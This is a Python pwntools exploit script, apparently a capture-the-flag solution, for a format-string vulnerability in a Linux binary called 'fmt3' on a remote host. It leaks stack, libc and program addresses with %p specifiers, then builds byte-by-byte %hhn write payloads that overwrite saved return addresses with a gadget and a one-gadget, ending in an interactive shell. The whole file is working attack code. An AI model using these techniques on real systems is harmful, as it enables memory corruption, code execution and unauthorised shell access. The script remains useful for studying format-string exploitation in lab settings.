from pwn import *
context(os="linux",arch="amd64",log_level="debug")
work_path="../dist/"
elf_name="fmt3"
libc_name="libc.so.6"
remote_addr="192.168.3.253"
remote_port=52002
elf_path=work_path+elf_name
libc_path=work_path+libc_name

if remote_addr!="": s=remote(remote_addr,remote_port)
else: s=process(elf_path)
elf=ELF(elf_path)
if libc_name!="": libc=ELF(libc_path)
def fmtstring(prev,word,index):
    if word==prev:
        result=0
        fmtstr=""
    elif word==0:
        result=256-prev
        fmtstr=f"%{result}c"
    elif prev<word:
        result=word-prev
        fmtstr=f"%{result}c"
    elif prev>word:
        result=256-prev+word
        fmtstr=f"%{result}c"
    fmtstr+=f"%{index}$hhn"
    return [fmtstr.encode(),result]
def fmt64(offset,original_offset,addr,content,inner=False):
    payloada=b""
    prev=0
    i=0
    if content==0:
        payload=f"%{offset+1}$lln".encode().ljust(8,b"A")+p64(addr)
        return payload
    while (content>>(i*8))>0:
        retl=fmtstring(prev,(content>>i*8)&0xff,offset+i)
        payloada+=retl[0]
        prev+=retl[1]
        prev&=0xff
        i+=1
    while len(payloada)%8!=0:
        payloada+=b"a"
    if offset==original_offset+len(payloada)/8 and inner:
        return payloada
    payload=fmt64(offset+1,original_offset,addr,content,True)
    if inner:
        return payload
    for ii in range(i):
        payload+=p64(addr+ii)
    return payload
def send_fmt(content,flag=False,exit_flag=False):
    s.sendlineafter(b"content: ",content)
    if flag:
        dat=s.recvline()[:-1]
    if exit_flag:
        s.sendafter(b"more?\n",b"n")
    else:
        s.sendafter(b"more?\n",b"y")
    if flag:
        return dat


if __name__=="__main__":
    dat=send_fmt(b"%40$p.%36$p.%30$p.",flag=True).split(b".")
    rbp=eval(dat[0])-0xf0+8
    libc.address=eval(dat[1])-(0x7ffff7fba2e8-0x7ffff7dc9000)
    elf.address=eval(dat[2])-0x40
    success(hex(rbp))
    success(hex(libc.address))
    success(hex(elf.address))
    addr_l=[]
    for i in range(6):
        addr_l.append(rbp+i*8)
    content_l=[libc.address+0x0000000000023b63,0,0,0,0,libc.address+0xe3afe]
    for i in range(len(addr_l)-1):
        send_fmt(fmt64(8,8,addr_l[i],content_l[i]))
    send_fmt(fmt64(8,8,addr_l[5],content_l[5]),exit_flag=True)
    s.interactive()